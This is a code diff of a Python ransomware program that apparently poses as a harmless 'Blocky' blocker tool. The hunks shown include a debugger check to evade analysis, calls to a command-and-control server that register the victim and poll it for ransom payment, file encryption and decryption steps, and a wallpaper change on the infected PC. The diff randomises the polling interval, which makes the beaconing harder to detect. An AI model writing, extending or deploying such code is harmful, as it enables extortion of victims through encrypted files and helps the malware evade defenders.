@@ -13,6 +13,7 @@ import os, sys  # Handling system related tasks (hostname/usernames)
 import ctypes  # Calling Windows APIs
 import threading  # Enabling Thread creation
 import datetime  # Handling time-related data
+from random import randint  # Random ints for 😴
 from time import sleep  # 😴
 
 # Variables
@@ -241,10 +242,9 @@ class Ransomware:
             except Exception as err:
                 print("start_decryption(): Error --> ", err)
 
-    def change_wallpaper(self, default=False):
+    def change_wallpaper(self, defaultWallpaper=False):
         "Change the wallpaper of the infected PC"
-        sleep(3)
-        if default:
+        if defaultWallpaper:
             try:
                 image_path = "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg"
                 ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
@@ -276,9 +276,6 @@ class Ransomware:
         except Exception as err:
             print("change_wallpaper(): Error --> ", err)
 
-    def fear_and_loathing(self):
-        self.change_wallpaper()
-
     def setup_decryption(self):
         """Setup the PyNaCL box again, so that decryption can take place"""
         response = httpx.post(f"{c2_url}/check/{self.victim_id}")
@@ -288,27 +285,29 @@ class Ransomware:
 
 
 def fake_main():
+    """Main function responsible for rnsm fucntionality"""
     if ctypes.windll.kernel32.IsDebuggerPresent():
         return
     rnsm = Ransomware()
     rnsm.create_remote_entry()
     rnsm.start_encryption()
-    rnsm.fear_and_loathing()
+    rnsm.change_wallpaper()
     # print("💲💲💲 Starting loop to check for payment receival...")
     while (
         httpx.post(f"{c2_url}/check/{rnsm.victim_id}").headers["Payment-Received"]
         == "False"
     ):
-        sleep(5)
+        sleep(randint(10, 120))
         # print("😴 Syncing...")
     # print("✔✔✔ Payment was received!")
     rnsm.setup_decryption()
     rnsm.start_decryption()
-    rnsm.change_wallpaper(default=True)
+    rnsm.change_wallpaper(defaultWallpaper=True)
     # print("🍾🍾🍾 You are all done, all files are now decrypted!")
 
 
 def main():
+    """Main function responsible for Blocky functionality"""
     blocky = FakeBlocker()
     blocky.is_admin()
     blocky.show_menu()
